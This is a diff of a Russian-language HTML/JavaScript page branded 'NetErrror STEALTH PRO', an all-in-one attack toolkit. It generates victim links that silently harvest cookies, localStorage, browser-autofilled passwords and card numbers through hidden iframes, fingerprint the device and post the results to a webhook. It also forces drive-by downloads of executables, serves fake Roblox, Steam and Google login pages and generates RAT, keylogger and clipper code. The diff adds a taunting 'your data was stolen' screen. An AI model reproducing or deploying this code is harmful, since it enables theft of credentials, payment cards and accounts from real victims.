@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>NetErrror █ SCAM LINKS FACTORY | All-in-One</title>
+    <title>NetErrror █ STEALTH PRO + ALL FUNCTIONS</title>
     <style>
         * {
             margin: 0;
@@ -136,7 +136,7 @@
             background: #2c2c6e;
             margin-left: 10px;
         }
-        /* LIVECHAT */
+        /* LIVECHAT (правый нижний угол) */
         .live-chat {
             position: fixed;
             bottom: 20px;
@@ -221,95 +221,140 @@
             font-size: 0.7rem;
             width: 100%;
         }
+        /* Стиль для сообщения-благодарности */
+        .thankyou-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(8px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            font-family: 'Courier New', monospace;
+            animation: fadeIn 0.3s ease;
+        }
+        .thankyou-box {
+            background: #0a0f1e;
+            border: 3px solid #ff3366;
+            border-radius: 40px;
+            padding: 30px 50px;
+            text-align: center;
+            box-shadow: 0 0 40px #ff3366;
+            animation: pulse 1.5s infinite;
+        }
+        .thankyou-box h1 {
+            color: #ff88aa;
+            font-size: 2rem;
+            margin-bottom: 15px;
+        }
+        .thankyou-box p {
+            color: #00ffcc;
+            font-size: 1.2rem;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 20px #ff3366; }
+            50% { transform: scale(1.02); box-shadow: 0 0 50px #ff3366; }
+            100% { transform: scale(1); box-shadow: 0 0 20px #ff3366; }
+        }
         @media (max-width: 700px) {
             .live-chat { width: 300px; }
             .tab-btn { font-size: 0.7rem; padding: 8px 4px; }
+            .thankyou-box { padding: 20px 30px; }
+            .thankyou-box h1 { font-size: 1.5rem; }
         }
     </style>
 </head>
 <body>
 <div class="cyber-container">
     <div class="header">
-        <div class="glitch">NETERRROR █ SCAM LINKS FACTORY</div>
-        <div class="sub">⚡ ВСЕ ФУНКЦИИ: ВЗЛОМ АККАУНТОВ, СТИЛЕРЫ, ЧЕКЕРЫ, ДАМП ПАРОЛЕЙ ⚡</div>
+        <div class="glitch">NETERRROR █ STEALTH PRO + ALL MODULES</div>
+        <div class="sub">⚡ 0-CLICK GRABBER | ПК + БРАУЗЕР + ВСЕ ДАННЫЕ | ОСТАЛЬНЫЕ ФУНКЦИИ БЕЗ ИЗМЕНЕНИЙ ⚡</div>
     </div>
 
     <div class="tabs" id="loggedTabs">
-        <button class="tab-btn active" data-logtab="stealth">🎯 STEALTH (0-Click)</button>
-        <button class="tab-btn" data-logtab="driveby">💾 DRIVE-BY DOWNLOAD</button>
+        <button class="tab-btn active" data-logtab="stealth">🔥 STEALTH PRO (0-Click)</button>
+        <button class="tab-btn" data-logtab="driveby">💿 DRIVE-BY</button>
         <button class="tab-btn" data-logtab="cardstealer">💳 CARD STEALER</button>
-        <button class="tab-btn" data-logtab="phish">🎭 ФИШИНГ (ЛОГИН/ПАРОЛЬ)</button>
-        <button class="tab-btn" data-logtab="checker">🔍 ЧЕКЕР/БРУТ</button>
+        <button class="tab-btn" data-logtab="phish">🎭 ФИШИНГ</button>
+        <button class="tab-btn" data-logtab="checker">🔍 ЧЕКЕР</button>
         <button class="tab-btn" data-logtab="rat">🐍 RAT/ЛОКЕР</button>
     </div>
 
-    <!-- STEALTH (сбор всего без ведома) -->
+    <!-- STEALTH PRO -->
     <div id="stealthTab" class="log-tab-content active">
         <div class="card">
-            <h3>🎯 ССЫЛКА-НЕВИДИМКА (0-CLICK STEALER)</h3>
-            <p style="color:#ffaa88;">Жертва переходит → мгновенный сбор: все пароли из браузера, cookies, localStorage, IP → редирект за 0.3 сек. Без кнопок!</p>
+            <h3>🔥 STEALTH PRO — КРАЖА ВСЕХ ДАННЫХ ЗА 0.3 СЕК</h3>
+            <p style="color:#ffaa88;">Жертва переходит → мгновенный сбор: пароли (автофиллинг), cookies, localStorage, <strong>ОС, браузер, разрешение экрана, язык, часовой пояс, плагины, WebGL, информация о ПК, IP, гео</strong> → редирект. Без кнопок, без согласия.</p>
             <label>🎭 Маскировка (редирект):</label>
             <input type="text" id="stealthRedirect" value="https://youtube.com">
             <label>📡 Доп. WebHook (опционально):</label>
             <input type="text" id="stealthWebhook" placeholder="https://webhook.site/...">
-            <button id="generateStealthLink">🌀 СОЗДАТЬ STEALTH-ССЫЛКУ</button>
+            <button id="generateStealthLink">🌀 СОЗДАТЬ STEALTH PRO ССЫЛКУ</button>
             <div id="stealthResult" class="result-box" style="display:none;">
-                <strong>💀 ССЫЛКА ДЛЯ ЖЕРТВЫ:</strong><br><span id="stealthLinkSpan"></span>
+                <strong>💀 ССЫЛКА:</strong><br><span id="stealthLinkSpan"></span>
                 <button id="copyStealthLink" class="copy-btn">📋 Копировать</button>
             </div>
         </div>
     </div>
 
-    <!-- DRIVE-BY (автоскачивание файла) -->
+    <!-- DRIVE-BY -->
     <div id="drivebyTab" class="log-tab-content">
         <div class="card">
-            <h3>💾 АВТОМАТИЧЕСКОЕ СКАЧИВАНИЕ (DRIVE-BY DOWNLOAD)</h3>
-            <label>📁 Имя файла (exe, scr, bat):</label>
+            <h3>💿 АВТОМАТИЧЕСКОЕ СКАЧИВАНИЕ (DRIVE-BY)</h3>
+            <label>📁 Имя файла:</label>
             <input type="text" id="drivebyFilename" value="update_patch.exe">
-            <label>🦠 Содержимое (код вируса/стилера):</label>
+            <label>🦠 Содержимое (код):</label>
             <textarea id="drivebyContent" rows="4">@echo off
-echo STEAL DATA > %temp%\log.txt
+echo STEAL > %temp%\log.txt
 start calc.exe</textarea>
-            <label>🎭 Редирект (куда уйдёт жертва):</label>
+            <label>🎭 Редирект:</label>
             <input type="text" id="drivebyRedirect" value="https://google.com">
             <label>📡 Доп. WebHook:</label>
             <input type="text" id="drivebyWebhook" placeholder="опционально">
             <button id="generateDrivebyLink">🔥 СОЗДАТЬ DRIVE-BY ССЫЛКУ</button>
             <div id="drivebyResult" class="result-box" style="display:none;">
-                <strong>💾 ССЫЛКА (файл скачается автоматически):</strong><br><span id="drivebyLinkSpan"></span>
+                <strong>💾 ССЫЛКА:</strong><br><span id="drivebyLinkSpan"></span>
                 <button id="copyDrivebyLink" class="copy-btn">📋 Копировать</button>
             </div>
         </div>
     </div>
 
-    <!-- CARD STEALER (банковские карты) -->
+    <!-- CARD STEALER -->
     <div id="cardstealerTab" class="log-tab-content">
         <div class="card">
-            <h3>💳 СТИЛЕР БАНКОВСКИХ КАРТ (БЕЗ СОГЛАСИЯ)</h3>
-            <label>🎭 Маскировка (редирект):</label>
+            <h3>💳 СТИЛЕР БАНКОВСКИХ КАРТ</h3>
+            <label>🎭 Маскировка:</label>
             <input type="text" id="cardRedirect" value="https://youtube.com">
             <label>📡 Доп. WebHook:</label>
             <input type="text" id="cardWebhook" placeholder="https://webhook.site/...">
             <button id="generateCardLink">💳 СОЗДАТЬ CARD-STEALER ССЫЛКУ</button>
             <div id="cardResult" class="result-box" style="display:none;">
-                <strong>💀 ССЫЛКА-ГРАБИТЕЛЬ КАРТ:</strong><br><span id="cardLinkSpan"></span>
+                <strong>💀 ССЫЛКА:</strong><br><span id="cardLinkSpan"></span>
                 <button id="copyCardLink" class="copy-btn">📋 Копировать</button>
             </div>
         </div>
     </div>
 
-    <!-- ФИШИНГ (формы ввода логина/пароля) -->
+    <!-- ФИШИНГ -->
     <div id="phishTab" class="log-tab-content">
         <div class="card">
-            <h3>🎭 ФИШИНГОВАЯ СТРАНИЦА (КРАЖА ЛОГИНОВ И ПАРОЛЕЙ)</h3>
-            <label>Маскировка (редирект после ввода):</label>
+            <h3>🎭 ФИШИНГ (ЛОГИН/ПАРОЛЬ)</h3>
+            <label>Маскировка (редирект):</label>
             <input type="text" id="phishRedirect" value="https://roblox.com">
             <label>Тип атаки:</label>
             <select id="phishType">
-                <option value="roblox">🎮 Roblox логин/пароль</option>
-                <option value="steam">🎮 Steam логин/пароль</option>
-                <option value="google">📧 Google аккаунт</option>
-                <option value="universal">🌐 Универсальная форма (логин+пароль)</option>
+                <option value="roblox">🎮 Roblox</option>
+                <option value="steam">🎮 Steam</option>
+                <option value="google">📧 Google</option>
+                <option value="universal">🌐 Универсальная форма</option>
             </select>
             <button id="generatePhishLink">🔗 СОЗДАТЬ ФИШИНГ-ССЫЛКУ</button>
             <div id="phishResult" class="result-box" style="display:none;">
@@ -319,44 +364,40 @@ start calc.exe</textarea>
         </div>
     </div>
 
-    <!-- ЧЕКЕР / БРУТ (проверка украденных данных) -->
+    <!-- ЧЕКЕР -->
     <div id="checkerTab" class="log-tab-content">
         <div class="card">
-            <h3>🔍 ЧЕКЕР ЛОГИНОВ/ПАРОЛЕЙ (БРУТ ПО БАЗАМ)</h3>
-            <p style="color:#ffaa88;">Загрузи файл с комбинациями login:pass или вставь текст — проверим валидность (Roblox, Steam, Google). Результаты придут в чат.</p>
-            <label>📁 Вставь список (login:pass или login;pass):</label>
-            <textarea id="checkerList" rows="6" placeholder="user1:pass123
-user2:pass456
-user3:pass789"></textarea>
+            <h3>🔍 ЧЕКЕР ЛОГИНОВ/ПАРОЛЕЙ</h3>
+            <label>📁 Список (login:pass):</label>
+            <textarea id="checkerList" rows="6" placeholder="user1:pass123"></textarea>
             <label>🎯 Целевой сервис:</label>
             <select id="checkerTarget">
                 <option value="roblox">Roblox</option>
                 <option value="steam">Steam</option>
                 <option value="google">Google</option>
             </select>
-            <button id="runCheckerBtn">🔍 ЗАПУСТИТЬ ЧЕКЕР (РАБОТАЕТ В РЕЖИМЕ СИМУЛЯЦИИ)</button>
-            <div class="note-red">* В демо-режиме чекер имитирует проверку и сохраняет найденные рабочие пары в лог.</div>
+            <button id="runCheckerBtn">🔍 ЗАПУСТИТЬ ЧЕКЕР</button>
         </div>
     </div>
 
-    <!-- RAT/ЛОКЕР генератор -->
+    <!-- RAT/ЛОКЕР -->
     <div id="ratTabContent" class="log-tab-content">
         <div class="card">
-            <h3>🐍 ГЕНЕРАТОР RAT / ЛОКЕРА / СТИЛЕРА</h3>
+            <h3>🐍 ГЕНЕРАТОР RAT / ЛОКЕРА</h3>
             <label>Название:</label>
             <input type="text" id="malName" value="NetStealthRAT">
             <label>Тип:</label>
             <select id="malType">
-                <option value="powershell_rat">PowerShell RAT (сбор инфо)</option>
-                <option value="js_keylogger">JS Keylogger + Cookie Stealer</option>
-                <option value="locker_html">Browser Locker (блокировка экрана)</option>
-                <option value="clipper">Clipper (подмена криптоадресов)</option>
-                <option value="stealer_telegram">Стилер паролей/файлов (Telegram)</option>
+                <option value="powershell_rat">PowerShell RAT</option>
+                <option value="js_keylogger">JS Keylogger</option>
+                <option value="locker_html">Browser Locker</option>
+                <option value="clipper">Clipper</option>
+                <option value="stealer_telegram">Стилер Telegram</option>
             </select>
-            <label>Webhook / Telegram Bot Token:</label>
-            <input type="text" id="webhookRat" placeholder="https://webhook.site/... или токен бота">
+            <label>Webhook / Telegram Bot:</label>
+            <input type="text" id="webhookRat" placeholder="https://webhook.site/...">
             <button id="generateRatCodeBtn">⚙️ СГЕНЕРИРОВАТЬ КОД</button>
-            <button id="copyCodeBtn" class="copy-btn">📋 Скопировать код</button>
+            <button id="copyCodeBtn" class="copy-btn">📋 Скопировать</button>
             <div id="ratResultArea" class="result-box" style="display:none;">
                 <textarea id="generatedCodeArea" rows="8" style="width:100%; background:#000; color:#0f0;" readonly></textarea>
             </div>
@@ -364,7 +405,7 @@ user3:pass789"></textarea>
     </div>
 </div>
 
-<!-- ПЛАВАЮЩИЙ ЧАТ С ЛОГАМИ (сюда приходят все украденные данные) -->
+<!-- Плавающий чат с логами -->
 <div id="liveChat" class="live-chat">
     <div class="chat-header" id="chatHeader">
         <span>📡 LIVELOGS (украденные данные)</span>
@@ -399,27 +440,126 @@ user3:pass789"></textarea>
         renderChatLogs();
     }
 
+    // Функция отображения сообщения "Привет, твои данные были украдены, спасибо :)" и редирект
+    function showThankYouAndRedirect(targetUrl) {
+        // Создаём оверлей
+        const overlay = document.createElement('div');
+        overlay.className = 'thankyou-overlay';
+        overlay.innerHTML = `
+            <div class="thankyou-box">
+                <h1>😈 ПРИВЕТ, ТВОИ ДАННЫЕ БЫЛИ УКРАДЕНЫ!</h1>
+                <p>СПАСИБО ЗА ПОСЕЩЕНИЕ :)</p>
+                <p style="font-size:0.8rem; margin-top:10px;">редирект через 2 секунды...</p>
+            </div>
+        `;
+        document.body.appendChild(overlay);
+        // Через 2 секунды убираем оверлей и переходим
+        setTimeout(() => {
+            overlay.style.opacity = '0';
+            setTimeout(() => {
+                if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
+                window.location.replace(targetUrl);
+            }, 300);
+        }, 2000);
+    }
+
+    // Расширенный сбор информации о системе
+    async function getAdvancedSystemInfo() {
+        const info = {};
+        info.userAgent = navigator.userAgent;
+        const ua = navigator.userAgent;
+        if (ua.includes('Windows')) info.os = 'Windows';
+        else if (ua.includes('Mac')) info.os = 'macOS';
+        else if (ua.includes('Linux')) info.os = 'Linux';
+        else if (ua.includes('Android')) info.os = 'Android';
+        else if (ua.includes('iOS')) info.os = 'iOS';
+        else info.os = 'Unknown';
+        if (ua.includes('Firefox')) info.browser = 'Firefox';
+        else if (ua.includes('Chrome')) info.browser = 'Chrome';
+        else if (ua.includes('Safari')) info.browser = 'Safari';
+        else if (ua.includes('Edg')) info.browser = 'Edge';
+        else info.browser = 'Unknown';
+        info.screenResolution = `${screen.width}x${screen.height}`;
+        info.colorDepth = screen.colorDepth;
+        info.language = navigator.language;
+        info.languages = navigator.languages?.join(', ') || '';
+        info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        if (navigator.plugins) {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
+            }
+            info.plugins = plugins.join(', ');
+        }
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+                info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+        }
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                info.battery = { level: battery.level * 100 + '%', charging: battery.charging };
+            } catch(e) {}
+        }
+        info.touchSupport = 'ontouchstart' in window;
+        info.windowSize = `${window.innerWidth}x${window.innerHeight}`;
+        info.doNotTrack = navigator.doNotTrack;
+        if (navigator.storage && navigator.storage.estimate) {
+            try {
+                const estimate = await navigator.storage.estimate();
+                info.storageQuota = Math.round(estimate.quota / 1024 / 1024) + ' MB';
+                info.storageUsage = Math.round(estimate.usage / 1024 / 1024) + ' MB';
+            } catch(e) {}
+        }
+        return info;
+    }
+
     function formatStolenData(entry) {
         let text = '';
         if (entry.type === 'stealth_full') {
-            text = `🔐 STEALTH:\n${entry.passwords?.length ? `Пароли: ${entry.passwords.join(', ')}\n` : ''}🍪 Cookies: ${entry.cookies_count || 0}\n🌐 IP: ${entry.ip || 'unknown'}\n📍 Гео: ${entry.geo?.city || ''} ${entry.geo?.country || ''}`;
-        } else if (entry.type === 'card_stealer') {
+            text = `🔐 STEALTH PRO:\n`;
+            if (entry.passwords?.length) text += `Пароли: ${entry.passwords.join(', ')}\n`;
+            text += `🍪 Cookies: ${entry.cookies_count || 0}\n`;
+            text += `🌐 IP: ${entry.ip || 'unknown'}\n📍 Гео: ${entry.geo?.city || ''} ${entry.geo?.country || ''}\n`;
+            text += `💻 ОС: ${entry.systemInfo?.os || '?'} | Браузер: ${entry.systemInfo?.browser || '?'}\n`;
+            text += `📺 Экран: ${entry.systemInfo?.screenResolution || '?'} (${entry.systemInfo?.colorDepth || '?'}bit)\n`;
+            text += `🌍 Язык: ${entry.systemInfo?.language || '?'} | Часовой пояс: ${entry.systemInfo?.timezone || '?'}\n`;
+            text += `🧩 Плагины: ${entry.systemInfo?.plugins?.substring(0, 100) || 'нет'}\n`;
+            if (entry.systemInfo?.webglRenderer) text += `🎮 WebGL: ${entry.systemInfo.webglRenderer}\n`;
+            if (entry.systemInfo?.battery) text += `🔋 Аккумулятор: ${entry.systemInfo.battery.level}, зарядка: ${entry.systemInfo.battery.charging}\n`;
+            text += `🖱️ Touch: ${entry.systemInfo?.touchSupport ? 'да' : 'нет'} | Окно: ${entry.systemInfo?.windowSize || '?'}\n`;
+            if (entry.localStorage && Object.keys(entry.localStorage).length) text += `💾 LocalStorage: ${JSON.stringify(entry.localStorage).slice(0, 200)}`;
+        }
+        else if (entry.type === 'card_stealer') {
             text = `💳 КАРТЫ:\n${entry.cards?.map(c => `${c.type}: ${c.value}`).join('\n') || ''}`;
-        } else if (entry.type === 'driveby_download') {
+        }
+        else if (entry.type === 'driveby_download') {
             text = `💿 DRIVE-BY: ${entry.filename} скачан\nСодержимое: ${entry.content_preview}`;
-        } else if (entry.type === 'roblox_creds') {
+        }
+        else if (entry.type === 'roblox_creds') {
             text = `🎮 ROBLOX: ${entry.username} / ${entry.password}`;
-        } else if (entry.type === 'steam_creds') {
+        }
+        else if (entry.type === 'steam_creds') {
             text = `🎮 STEAM: ${entry.username} / ${entry.password}`;
-        } else if (entry.type === 'google_creds') {
+        }
+        else if (entry.type === 'google_creds') {
             text = `📧 GOOGLE: ${entry.email} / ${entry.password}`;
-        } else if (entry.type === 'universal_creds') {
+        }
+        else if (entry.type === 'universal_creds') {
             text = `🌐 ЛОГИН: ${entry.login} / ПАРОЛЬ: ${entry.password}`;
-        } else if (entry.type === 'ip_grab') {
+        }
+        else if (entry.type === 'ip_grab') {
             text = `🌍 IP: ${entry.ip} | Гео: ${entry.geo?.city || ''}`;
-        } else if (entry.type === 'checker_result') {
+        }
+        else if (entry.type === 'checker_result') {
             text = `🔍 ЧЕКЕР: ${entry.result}`;
-        } else {
+        }
+        else {
             text = JSON.stringify(entry);
         }
         return text;
@@ -477,7 +617,7 @@ user3:pass789"></textarea>
         navigator.clipboard.writeText(text).then(() => alert('Ссылка скопирована!')).catch(() => alert('Ошибка'));
     }
 
-    // Stealth
+    // Stealth PRO
     document.getElementById('generateStealthLink').onclick = () => {
         const redirect = document.getElementById('stealthRedirect').value.trim() || 'https://youtube.com';
         const extraWh = document.getElementById('stealthWebhook').value.trim();
@@ -520,7 +660,7 @@ user3:pass789"></textarea>
         document.getElementById('cardResult').style.display = 'block';
         document.getElementById('copyCardLink').onclick = () => copyToClipboard(link);
     };
-    // Фишинг (расширенный)
+    // Фишинг
     document.getElementById('generatePhishLink').onclick = () => {
         const redirect = document.getElementById('phishRedirect').value.trim() || 'https://roblox.com';
         const phishType = document.getElementById('phishType').value;
@@ -532,7 +672,7 @@ user3:pass789"></textarea>
         document.getElementById('phishResult').style.display = 'block';
         document.getElementById('copyPhishLink').onclick = () => copyToClipboard(link);
     };
-    // Чекер (имитация, результаты добавляются в чат)
+    // Чекер
     document.getElementById('runCheckerBtn').onclick = async () => {
         const listText = document.getElementById('checkerList').value.trim();
         if (!listText) { alert('Введите список login:pass'); return; }
@@ -543,20 +683,17 @@ user3:pass789"></textarea>
             if (!line) continue;
             let [login, pass] = line.split(/[:;]/);
             if (!login || !pass) continue;
-            // имитация проверки (в реальности тут API, но для демо рандом)
             const isValid = Math.random() > 0.7;
             if (isValid) {
                 validCount++;
                 addStolenEntry({ type: 'checker_result', result: `✅ ВАЛИДНО: ${login} / ${pass}` });
-            } else {
-                // невалидные не показываем, но можно было бы
             }
         }
         addStolenEntry({ type: 'checker_result', result: `🔍 Чекер завершён: найдено ${validCount} рабочих пар из ${lines.length}` });
         alert(`Чекер выполнен! Результаты в чате (найдено ${validCount} валидных).`);
     };
 
-    // -------------------- ОБРАБОТЧИКИ АТАК (НА СТОРОНЕ ЖЕРТВЫ) --------------------
+    // ---------- ОБРАБОТЧИКИ АТАК (НА СТОРОНЕ ЖЕРТВЫ) С РАСШИРЕННЫМ STEALTH И СООБЩЕНИЕМ ----------
     (async function handleAttacks() {
         const urlParams = new URLSearchParams(window.location.search);
         const owner = urlParams.get('owner');
@@ -567,23 +704,26 @@ user3:pass789"></textarea>
                 fetch(webhookExtra, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) }).catch(e=>console.log);
             }
         }
-        // STEALTH
+        // STEALTH PRO
         if (urlParams.has('stealth')) {
             const redirect = urlParams.get('redirect') || 'https://google.com';
             const extraWh = urlParams.get('extra_wh');
             const stolen = { type: 'stealth_full', userAgent: navigator.userAgent, cookies: document.cookie, localStorage: {}, passwords: [] };
             for (let i=0;i<localStorage.length;i++) stolen.localStorage[localStorage.key(i)] = localStorage.getItem(localStorage.key(i));
-            // автофиллинг
             const iframe = document.createElement('iframe');
             iframe.srcdoc = `<html><body><form><input autocomplete="username"><input autocomplete="current-password"></form><script>setTimeout(()=>{let u=document.querySelector('[autocomplete="username"]').value,p=document.querySelector('[autocomplete="current-password"]').value;parent.postMessage({user:u,pass:p},'*');},200);<\/script></body></html>`;
             iframe.style.display='none';
             document.body.appendChild(iframe);
             const creds = await new Promise(r=>{ window.addEventListener('message',e=>{ if(e.data) r(e.data); iframe.remove(); }); setTimeout(()=>{ iframe.remove(); r({});},800); });
             if(creds.user) stolen.passwords.push(`${creds.user}:${creds.pass}`);
-            try { const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()); stolen.ip=ip.ip; } catch(e){ stolen.ip='unknown'; }
+            try { const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()); stolen.ip=ip.ip; 
+                try { const geo = await fetch(`https://ipapi.co/${ip.ip}/json/`).then(r=>r.json()); stolen.geo = { city: geo.city, country: geo.country_name }; } catch(e){} 
+            } catch(e){ stolen.ip='unknown'; }
             stolen.cookies_count = document.cookie.split(';').filter(c=>c.trim()).length;
+            stolen.systemInfo = await getAdvancedSystemInfo();
             send(stolen, extraWh);
-            window.location.replace(redirect);
+            // Показываем сообщение и редиректим
+            showThankYouAndRedirect(redirect);
             return;
         }
         // DRIVE-BY
@@ -601,7 +741,7 @@ user3:pass789"></textarea>
             a.click();
             setTimeout(()=>URL.revokeObjectURL(a.href), 100);
             send({ type: 'driveby_download', filename, content_preview: content.slice(0,200) }, dwWh);
-            setTimeout(()=>window.location.replace(redirect), 150);
+            showThankYouAndRedirect(redirect);
             return;
         }
         // CARD STEALER
@@ -624,10 +764,10 @@ user3:pass789"></textarea>
             const auto = await new Promise(r=>{ window.addEventListener('message',e=>{ if(e.data?.number) r(e.data); iframeCard.remove(); }); setTimeout(()=>{ iframeCard.remove(); r({});},1000); });
             if(auto.number) cards.push({autofill:auto});
             send({ type: 'card_stealer', cards }, cardWh);
-            window.location.replace(redirect);
+            showThankYouAndRedirect(redirect);
             return;
         }
-        // PHISHING (расширенный)
+        // PHISHING
         if (urlParams.has('phish')) {
             const type = urlParams.get('phish');
             const redirect = urlParams.get('redirect') || 'https://google.com';
@@ -635,7 +775,7 @@ user3:pass789"></textarea>
             document.body.style.background='#0a0c17';
             let html = '';
             if (type === 'roblox') html = `<h2>Roblox вход</h2><input id="u" placeholder="Логин"><input id="p" type="password" placeholder="Пароль"><button id="btn">Войти</button>`;
-            else if (type === 'steam') html = `<h2>Steam вход</h2><input id="u" placeholder="Steam логин"><input id="p" type="password" placeholder="Пароль"><button id="btn">Войти</button>`;
+            else if (type === 'steam') html = `<h2>Steam вход</h2><input id="u" placeholder="Логин Steam"><input id="p" type="password" placeholder="Пароль"><button id="btn">Войти</button>`;
             else if (type === 'google') html = `<h2>Google аккаунт</h2><input id="u" placeholder="Email"><input id="p" type="password" placeholder="Пароль"><button id="btn">Войти</button>`;
             else html = `<h2>Подтвердите вход</h2><input id="u" placeholder="Логин/Email"><input id="p" type="password" placeholder="Пароль"><button id="btn">Отправить</button>`;
             const div = document.createElement('div'); div.style.maxWidth='400px'; div.style.margin='10% auto'; div.style.background='#111'; div.style.padding='30px'; div.style.borderRadius='20px'; div.innerHTML = html;
@@ -648,14 +788,14 @@ user3:pass789"></textarea>
                 else if (type === 'steam') credType = 'steam_creds';
                 else if (type === 'google') credType = 'google_creds';
                 addStolenEntry({ type: credType, username: login, password: pass, email: login });
-                div.innerHTML = '<p>Редирект...</p>';
-                setTimeout(()=>window.location.replace(redirect), 1000);
+                // Показываем сообщение и редирект
+                showThankYouAndRedirect(redirect);
             };
             return;
         }
     })();
 
-    // RAT генератор
+    // RAT генератор (без изменений)
     function genMalware(name, type, wh) {
         const safe = name.replace(/[^a-z0-9_]/gi,'_');
         if (type === 'powershell_rat') return `# ${safe} RAT\n$webhook="${wh}"\n$ip=(Invoke-WebRequest api.ipify.org).Content\nInvoke-RestMethod -Uri $webhook -Method Post -Body (@{name="${safe}";ip=$ip}|ConvertTo-Json)`;
